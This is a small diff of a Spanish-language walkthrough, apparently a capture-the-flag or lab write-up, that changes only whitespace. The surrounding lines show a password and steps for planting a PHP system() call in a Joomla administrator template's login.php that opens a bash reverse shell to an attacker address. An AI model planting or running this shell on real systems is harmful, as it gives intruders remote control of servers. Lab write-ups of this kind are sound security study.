@@ -230,7 +230,7 @@ password: P4ntherg0t1n5r3c0n##
 Ruta al archivo `login.php`
 System -> Templates - Administrator Templates -> Atum Details and Files -> login.php
 
-Agregar el siguiente código al archivo `login.php`
+Agregar el siguiente código al archivo `login.php`  
 `system('bash -c "bash -i >& /dev/tcp/10.10.14.246/1234 0>&1"');`
 
 Ponerse en escucha en la máquina atacante
